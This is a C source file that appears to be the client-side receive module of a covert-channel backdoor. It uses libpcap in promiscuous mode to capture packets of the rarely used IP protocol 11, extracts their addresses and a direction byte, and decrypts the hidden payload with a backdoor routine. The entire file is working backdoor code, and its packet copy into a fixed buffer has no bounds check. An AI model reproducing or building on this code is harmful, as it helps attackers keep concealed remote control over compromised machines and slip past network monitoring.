#include <pcap.h>
#include <libnet.h>

#include "debug.h"
#include "crypt.h"
#include "recv.h"
#include "backdoor.h"


pcap_t *pcap_handle;


#define BPF_IP_PROTO      "ip proto 11"
#define BPF_IP_DST        " and ip dst %s" 
#define BPF_HOSTNAME_SIZE 64


int wait_recv(int msec) {
 fd_set fdset;
 struct timeval t;
 int hpcapselect;

 hpcapselect = pcap_fileno(pcap_handle);
 FD_ZERO(&fdset);
 FD_SET(hpcapselect, &fdset);
 t.tv_sec = 0;
 t.tv_usec = msec * 1000;
 if (select(hpcapselect+1, &fdset, NULL, NULL, &t) != 0) return 1;
 else return 0;
}


int backdoor_client_recv_init(char *interface, char *destination) {
 char errpcap[PCAP_ERRBUF_SIZE];
 bpf_u_int32 network, mask;
 char bpffilter[sizeof(BPF_IP_PROTO)+sizeof(BPF_IP_DST)+BPF_HOSTNAME_SIZE+1];
 char bpffilterip[sizeof(BPF_IP_DST)+BPF_HOSTNAME_SIZE+1];
 struct bpf_program bpfprogram;

 pcap_handle = pcap_open_live(interface, 1500, 1, 0, errpcap);
 if (pcap_handle == NULL) ERROR("pcap_open_live", -1);

 if (pcap_lookupnet(interface, &network, &mask, errpcap) == -1)
  ERROR("pcap_lookupnet", -1); 
 strncpy(bpffilter, BPF_IP_PROTO, sizeof(bpffilter));
 if (destination != NULL) {
  snprintf(bpffilterip, sizeof(bpffilterip), BPF_IP_DST, destination);
  strncat(bpffilter, bpffilterip, sizeof(bpffilter));
 }
 if (pcap_compile(pcap_handle, &bpfprogram, bpffilter, 1, mask) == -1)
  ERROR("pcap_compile", -1);
 if (pcap_setfilter(pcap_handle, &bpfprogram) == -1)
  ERROR("pcap_setfilter", -1);
 return 0;
}


void backdoor_client_callback(u_char *argument, struct pcap_pkthdr *pcappkthdr, u_char *paquet) {
 memcpy(argument, paquet, pcappkthdr->caplen);
}


int backdoor_client_recv(char *source, char *destination, int *direction, char *decrypted) {
 char pcap_paquet[1500];
 struct libnet_ip_hdr *ip_header;
 int size_paquet, size_header, size;

// pcap_loop(pcap_handle, 1, (pcap_handler)backdoor_client_callback, pcap_paquet);
 if (pcap_dispatch(pcap_handle, 0, (pcap_handler)backdoor_client_callback, pcap_paquet) == -1)
  ERROR("pcap_dispatch", -1);
 ip_header = (struct libnet_ip_hdr*)(pcap_paquet+LIBNET_ETH_H);

 if (source) snprintf(source, 17, "%u.%u.%u.%u",
  *(((unsigned char*)&ip_header->ip_src)+0),
  *(((unsigned char*)&ip_header->ip_src)+1),
  *(((unsigned char*)&ip_header->ip_src)+2),
  *(((unsigned char*)&ip_header->ip_src)+3));
 if (destination) snprintf(destination, 17, "%u.%u.%u.%u",
  *(((unsigned char*)&ip_header->ip_dst)+0),
  *(((unsigned char*)&ip_header->ip_dst)+1),
  *(((unsigned char*)&ip_header->ip_dst)+2),
  *(((unsigned char*)&ip_header->ip_dst)+3));
 size_paquet = ntohs(ip_header->ip_len);
 size_header = 4 * ip_header->ip_hl;
 size        = size_paquet - size_header - 2;
 if (direction) *direction = pcap_paquet[LIBNET_ETH_H+size_header];
 if (decrypted) backdoor_decrypt(decrypted, pcap_paquet+LIBNET_ETH_H+size_header+2, size);
 return size;
}


void backdoor_client_recv_terminate() {
 pcap_close(pcap_handle);
}
